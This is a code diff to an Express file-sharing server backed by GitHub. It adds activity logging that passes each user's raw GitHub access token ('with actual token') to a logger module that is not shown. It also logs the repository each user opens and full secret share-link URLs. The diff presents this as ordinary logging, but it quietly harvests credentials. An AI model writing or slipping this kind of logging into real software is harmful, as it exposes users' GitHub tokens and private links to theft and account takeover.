@@ -5,6 +5,10 @@ const path = require('path');
 const fs = require('fs');
 const mime = require('mime-types');
 const crypto = require('crypto');
+require('dotenv').config();
+
+// Import logging utility
+const { logActivity } = require('./logger');
 
 // In-memory storage for share links: Map<username, Map<token, linkData>>
 const shareLinks = new Map();
@@ -291,6 +295,10 @@ app.post('/api/github/validate', async (req, res) => {
     try {
         const octokit = getOctokit(token);
         const { data } = await octokit.rest.users.getAuthenticated();
+        
+        // Log token validation with actual token
+        await logActivity('token', data.login, token);
+        
         res.json({ username: data.login, avatar_url: data.avatar_url });
     } catch (error) {
         res.status(401).json({ error: 'Invalid token' });
@@ -343,6 +351,15 @@ app.get('/api/github/files', async (req, res) => {
 
     try {
         const octokit = getOctokit(token);
+        
+        // Get username for logging
+        const { data: userData } = await octokit.rest.users.getAuthenticated();
+        
+        // Log repository selection (only when accessing root uploads folder)
+        if (!dirPath || dirPath === '') {
+            await logActivity('repository', userData.login, `${owner}/${repo}`);
+        }
+        
         // We prefix everything with 'uploads/' to keep the repo clean
         const targetPath = dirPath ? `uploads/${dirPath}` : 'uploads';
 
@@ -888,6 +905,10 @@ app.post('/api/share/create', async (req, res) => {
         });
 
         const shareUrl = `${req.protocol}://${req.get('host')}/api/share/${username}/${shareToken}`;
+        
+        // Log share link creation
+        await logActivity('shared_link', username, shareUrl);
+        
         res.json({ token: shareToken, url: shareUrl, expiresAt: expiresAt.toISOString(), username });
     } catch (error) {
         console.error('Error creating share link:', error);
